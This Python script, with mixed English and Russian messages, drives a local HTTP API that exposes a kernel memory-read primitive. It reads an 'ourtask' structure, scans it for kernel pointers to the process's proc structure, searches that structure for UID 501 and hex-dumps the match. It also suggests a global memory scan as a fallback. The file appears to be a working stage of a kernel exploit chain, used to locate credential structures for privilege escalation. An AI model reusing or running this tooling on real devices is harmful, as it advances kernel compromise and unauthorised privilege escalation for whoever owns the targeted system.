#!/usr/bin/env python3
"""Find proc pointer via ourtask structure.

Usage: python find_proc_via_task.py [--api http://host:port]

Reads ourtask from /api/v1/ds, scans 0x0-0x200 for kernel-like pointers to proc,
and if found dumps 256 bytes at that address and searches for UID 501 pattern.
If nothing found, prints 'Task structure empty/invalid' and suggests a global scan.
"""
import os
import sys
import time
import requests

TIMEOUT = 20.0
KREAD_RETRIES = 3


def panic(msg):
    print(msg)
    sys.exit(1)


def api_get(base, path):
    try:
        r = requests.get(base + path, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API GET.')
        sys.exit(1)
    except Exception as e:
        print('api_get error', e)
        return None


def api_post(base, path, json=None):
    try:
        r = requests.post(base + path, json=json, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API POST.')
        sys.exit(1)
    except Exception as e:
        print('api_post error', e)
        return None


def kread_bytes(base, addr, size):
    last = None
    for attempt in range(1, KREAD_RETRIES+1):
        resp = api_post(base, '/api/v1/kread', json={'addr': hex(addr), 'size': size})
        if resp is None:
            last = RuntimeError('kread no resp')
            time.sleep(0.3)
            continue
        if 'value' in resp and isinstance(resp['value'], str):
            s = resp['value']
            if s.startswith('0x'):
                s = s[2:]
            if len(s) % 2:
                s = '0' + s
            data = bytes.fromhex(s)
            return data
        if 'data' in resp:
            d = resp['data']
            if isinstance(d, list):
                return bytes(d)
            if isinstance(d, str):
                s = d[2:] if d.startswith('0x') else d
                if len(s) % 2:
                    s = '0' + s
                return bytes.fromhex(s)
        last = RuntimeError('kread unsupported format')
        time.sleep(0.3)
    raise last if last else RuntimeError('kread failed')


def is_kernel_ptr(u64):
    try:
        h = hex(u64)
        return h.startswith('0xffffffe') or h.startswith('0xffffffd')
    except Exception:
        return False


def scan_task_for_proc(base, task_addr):
    print('Читаю ourtask...')
    data = kread_bytes(base, task_addr, 0x200)
    # scan every 8-byte aligned field for a pointer
    for off in range(0, 0x200 - 7, 8):
        q = data[off:off+8]
        if len(q) < 8:
            continue
        u = int.from_bytes(q, 'little')
        if is_kernel_ptr(u):
            print(f'Найден кандидат proc по адресу 0x{u:016x} (offset 0x{off:x} в ourtask)')
            print('Проверка UID...')
            # read 256 bytes at candidate
            try:
                pbuf = kread_bytes(base, u, 256)
            except Exception as e:
                print('kread failed for candidate proc', e)
                continue
            # search for UID pattern
            uid = b'\xf5\x01\x00\x00'
            idx = pbuf.find(uid)
            if idx != -1:
                print(f'Найден UID501 в proc dump по смещению 0x{idx:02x} (абсолютно 0x{u+idx:016x})')
                print('Dump 256 bytes of candidate proc:')
                for i in range(0, len(pbuf), 16):
                    row = pbuf[i:i+16]
                    print(f'{u+i:016x}: ' + ' '.join(f'{b:02x}' for b in row))
                return True
            else:
                print('UID не найден в этом кандидате')
    return False


def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--api', default=os.environ.get('API_BASE', 'http://127.0.0.1:8000'))
    args = p.parse_args()
    base = args.api.rstrip('/')

    ds = api_get(base, '/api/v1/ds')
    if not ds or 'ourtask' not in ds:
        panic('ourtask not present in /api/v1/ds')
    ourtask = int(ds['ourtask'], 0) if isinstance(ds['ourtask'], str) else int(ds['ourtask'])
    print('ourtask =', hex(ourtask))

    found = scan_task_for_proc(base, ourtask)
    if not found:
        print('Task structure empty/invalid')
        print('Рекомендуется запустить глобальный скан памяти по сигнатуре UID (Plan C fallback)')


if __name__ == '__main__':
    main()
